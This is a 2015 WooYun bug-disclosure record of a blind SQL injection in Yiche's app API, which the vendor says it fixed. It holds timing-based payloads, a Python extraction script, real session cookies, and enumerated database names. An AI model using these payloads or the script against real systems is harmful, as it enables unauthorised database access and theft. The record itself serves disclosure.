{"id": 71815, "wybug_id": "wooyun-2015-0149383", "wybug_title": "易车网某处存在SQL注入漏洞（可跨25个库及所有数据）附验证脚本", "wybug_corp": "易车", "wybug_author": "路人甲", "wybug_date": "2015-10-26 10:57", "wybug_open_date": "2015-12-10 11:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向公众公开  简要描述： 易车SQL注入 详细说明：  目标：易车网官网APP检测发现以下地方存在注入：（POST中的carids，stacked queries）\nPOST http://api.ycapp.yiche.com/Car/GetCarStylePropertys HTTP/1.1Host: api.ycapp.yiche.comCookie: __cs_visitor=1445701271467275; __v3_cs_skey_10027=4hmi4s; a=Rw0qZ0AXX3h5; tsc=3_562ba697_562ba697_0_1Accept-Encoding: gzip,deflateX-Requested-With: XMLHttpRequestContent-Length: 109Content-Type: application/x-www-form-urlencodedConnection: keep-aliveAccept: */*User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0carids=114069,114070,114071,114018,114065,114067,114064,114066,114068,102164,102159,102163,102155,102148,102147,102152\nSQLMap证据截图：\n\n看了下网站被没设什么过滤或者WAF，但是SQLMAP并没跑出库名来；一、暴数据方法后来研究了下发现，由于这个参数中的本来就存在逗号，所以逗号会被程序脚本作为分隔符处理掉，这样就传不到数据库了，所以相当于逗号就被过滤了，也就是说注入语句中不能存在逗号。如果是MySQL数据库的话，直接用substr(user() from 1 for 1)来替代substr(user(),1,1)即可，但是此数据库为MSSQL，只支持substring(user,1,1)，必须使用逗号。后来想了下，使用了字符串比较的方法解决，MSSQL比较字符串是一个个字符往后比ASCII，不管长度如何，只要在前N位分出大小，则停止比较。故按此原理可逐位推算出DB_NAME()等数据。如\n; if(db_name()>'Y') waitfor delay '0:0:5'-- -\n\n; if(db_name()>'YI') waitfor delay '0:0:5'-- -\n不断枚举最后一位的字符即可~Python程序如下，以跑11位的当前数据库名为例：（程序中设了个代理，如需使用，请取消）\n#!/usr/bin/env python#coding=utf8import httplib, urllib, re, timecount = 0user_name = ''httpClient = Nonefor i in range(1,15):    a = 33    while a < 128:        try:            params = 'carids=114069;if(db_name()<\\''+user_name+chr(a)+'\\') waitfor delay \\'0:0:5\\' -- -'            headers = {\"Host\": \"api.ycapp.yiche.com\",                        \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0\",                        \"Accept-Encoding\": \"gzip,deflate\",                        \"Accept\": \"*/*\",                        \"Cookie\": \"__cs_visitor=1445701271467275; __v3_cs_skey_10027=4hmi4s; a=Rw0qZ0AXX3h5; tsc=3_562ba697_562ba697_0_1\",                        \"Connection\": \"keep-alive\",                        \"X-Requested-With\": \"XMLHttpRequest\",                        \"Content-Type\": \"application/x-www-form-urlencoded\",                        \"Content-Length\": len(params)}            httpClient = httplib.HTTPConnection(\"192.168.1.2\", 8888, timeout=30)            httpClient.request(\"POST\", \"http://api.ycapp.yiche.com/Car/GetCarStylePropertys\", params, headers)            st = time.time()            response = httpClient.getresponse()                        #rp = response.read()            if count == 1:                if time.time()-st > 5:                    user_name = user_name + chr(a-1)                    print \"db_name: \"+user_name                    count = 0                    break                else:                    count = 0            else:                if time.time()-st > 5:                    count = 1                    a = a - 1            a = a+1                    except Exception, e:            print e        finally:            if httpClient:                httpClient.close()\n二、数据证明1）当前数据库：YICHEMOBILE\n;if(db_name='XXX') waitfor delay '0:0:3' -- -\n（XXX按一中原理遍历）\n\n2）所有数据库个数，共25个\ncarids=114069;if((select count(*) from master.dbo.sysdatabases)=25) waitfor delay '0:0:3' -- -\n3）所有数据库名，这里只列出一些吧，其他的就不跑了\ncarids=114069;if((select name from master.dbo.sysdatabases where dbid=YYY)='XXX') waitfor delay '0:0:3' -- -\n（XXX按一中原理遍历，YYY从1-25，即可遍历25个库名）================MASTERTEMPDBMODELMSDBBITAUTOUSERCRMBITAUTOBIBITAUTOUGCMONITORYICHEMALLPAYMENTMARKETINVOICEDEALERASSISTANTSYSTEMYICHEMOBILEYICHEMOBILECOMMUNITYYICHEACTIVITYYICHEMEDIAYICHEMOBILESUBSCRIBEMARKETCOUPONS............================\n\n4）我们来看下当前库YICHEMOBILE吧，共930个表\ncarids=114069;if((select count(*) from yichemobile.dbo.sysobjects)=930) waitfor delay '0:0:5' -- -\n5）我们来看两个表名吧，其他的表及具体的数据就深入咯~\ncarids=114069;if((select top 1 name from yichemobile.dbo.sysdatabases)='XXX') waitfor delay '0:0:3' -- -\n\n\n   漏洞证明：     修复方案：  请多指教~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-26 10:59 厂商回复： 非常感谢对易车的帮助，我们尽快处理。谢谢 最新状态： 2015-10-27：已经修复了，非常感谢对易车的支持。谢谢  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}